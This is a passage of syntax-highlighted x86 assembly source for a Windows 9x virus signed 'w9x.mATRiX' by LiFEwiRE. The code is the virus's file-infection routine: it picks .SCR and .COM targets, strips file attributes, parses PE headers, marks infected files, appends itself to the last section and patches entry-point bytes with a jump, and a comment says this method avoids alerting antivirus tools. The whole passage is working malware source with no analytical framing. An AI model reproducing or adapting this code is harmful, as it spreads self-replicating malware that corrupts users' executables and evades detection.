        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infectit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'RCS.'</span><span class="sc0">                  </span><span class="sc1">;screensaver?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infectit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'MOC.'</span><span class="sc0">                  </span><span class="sc1">;a com? (indeed !!:)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nocomfile</span><span class="sc0"> 
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">payloadinfector</span><span class="sc0">
</span><span class="sc5">nocomfile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">quitinfect</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">busy</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;hope eax &lt;&gt; 'busy' :)</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"&lt;w9x.mATRiX."</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virusz</span><span class="sc4">/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virusz</span><span class="sc4">/</span><span class="sc2">0100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virusz</span><span class="sc4">/</span><span class="sc2">0010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virusz</span><span class="sc4">/</span><span class="sc2">0001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"0001086 &amp; MyLittlePoly."</span><span class="sc0">       </span><span class="sc1">;enough space for counter :)</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">polysz</span><span class="sc4">/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">polysz</span><span class="sc4">/</span><span class="sc2">0100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">polysz</span><span class="sc4">/</span><span class="sc2">0010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">polysz</span><span class="sc4">/</span><span class="sc2">0001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">+</span><span class="sc12">'0'</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" Debug Version"</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" by LiFEwiRE [sHAD0WvX]&gt;"</span><span class="sc0">



</span><span class="sc5">dontinfect</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;when attrs. were already modified</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;get attribs + 1 = set</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;old attrs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;pointer to buffer with filen.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">                       </span><span class="sc1">;RESTORE ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">quitinfect</span><span class="sc0">


</span><span class="sc5">cryptkey</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cryptkey2</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ****    REAL PE INFECTION PART  ****</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">infectit</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkname</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">quitinfect</span><span class="sc0">                      </span><span class="sc1">;if name = bad</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">":D"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">quitinfect</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;eax=4300+1 = set</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;save attribs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;and esi,no new LEA needed</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;new attr</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;ecx=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;edx=1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;ebx=2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">dontinfect</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;file handle</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">pointertope</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;read pointer to PE at 3ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">;into pointertope</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">peheader</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;peheader buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">                        </span><span class="sc1">;1024 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">pointertope</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;pointer to pe header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">             </span><span class="sc1">;is pe?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nope</span><span class="sc0">                            </span><span class="sc1">;nope, its noPE :)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0badc0deh</span><span class="sc0">                   </span><span class="sc1">;already infected?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;4ch = reserved</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nope</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;save handle for after calcs.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                         </span><span class="sc1">;esi+18h=start of OptionalHeader</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;esi-4 = pe/0/0+14h = size OH</span><span class="sc0">
                                                </span><span class="sc1">;optionalheader+size=allocation table</span><span class="sc0">

        </span><span class="sc1">;edi = PE/0/0, esi = allocation table</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;put in ecx nr. of sections</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;startvalue of eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sectionsearch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;is it the highest?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">lower</span><span class="sc0">                           </span><span class="sc1">;no</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;remember section nr.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;and remember value</span><span class="sc0">
</span><span class="sc5">lower</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                         </span><span class="sc1">;steps of 28h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">sectionsearch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                         </span><span class="sc1">;multiply with section length</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;esi points now to section header</span><span class="sc0">

</span><span class="sc1">;    Section header layout, Tdump names things other (4 example rawdata)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;esi+0h      8h      Section's name (.reloc, .idata, .LiFEwiRE)</span><span class="sc0">
</span><span class="sc1">;    8h      4h      VirtualSize</span><span class="sc0">
</span><span class="sc1">;    0ch     4h      RelativeVirtualAdress</span><span class="sc0">
</span><span class="sc1">;    10h     4h      SizeOfRawData</span><span class="sc0">
</span><span class="sc1">;    14h     4h      PointerToRawData</span><span class="sc0">
</span><span class="sc1">;    18h     4h      PointerToRelocations</span><span class="sc0">
</span><span class="sc1">;    1ch     4h      PointerToLinenumbers</span><span class="sc0">
</span><span class="sc1">;    20h     2h      NumberOfRelocations</span><span class="sc0">
</span><span class="sc1">;    22h     2h      NumberOfLinenumbers</span><span class="sc0">
</span><span class="sc1">;    24h     4h      Characteristics</span><span class="sc0">


</span><span class="sc1">;       ESI points to Section header, EDI points to PE</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc5">sectionflags</span><span class="sc0">          </span><span class="sc1">; Update section's flagz</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EDX = SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; EAX = SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EDX = New EIP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Where append virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Save it</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;backup entry RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">base</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newEIP</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;save it</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;edx=neweip+imagebase</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">distance</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; Store the address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                         </span><span class="sc1">;esi+18h=start of OptionalHeader</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;esi-4 = pe/0/0+14h = size OH</span><span class="sc0">

        </span><span class="sc1">;ESI points to the allocation table,EDI to PE</span><span class="sc0">

        </span><span class="sc1">;lets find the section which contains the RVA.</span><span class="sc0">

        </span><span class="sc1">;then the place where to put the jump is entry-rva+phys.</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">


</span><span class="sc5">look</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;Old EntryPoint (RVA)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;VirtualAddres</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;VirtualSize</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">look</span><span class="sc0"> 

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;sub RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;add PhysicalOffset</span><span class="sc0">
                                                </span><span class="sc1">;EAX is now the PhysicalOffset</span><span class="sc0">
                                                </span><span class="sc1">;of the EntryPoint</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc5">sectionflags</span><span class="sc0">          </span><span class="sc1">; Update section's flagz</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oldbytes</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;read pointer to PE at 3ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">JmpToCodesz</span><span class="sc0">                 </span><span class="sc1">;into pointertope</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">randombla</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;random value</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;and write new bytes at entry</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JmpToCode</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;point to make code jmp to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">                </span><span class="sc1">;the section which contains</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">JmpToCodesz</span><span class="sc0">                 </span><span class="sc1">;the viruscode (modifying the</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">                       </span><span class="sc1">;entry RVA will alert AV's)</span><span class="sc0">

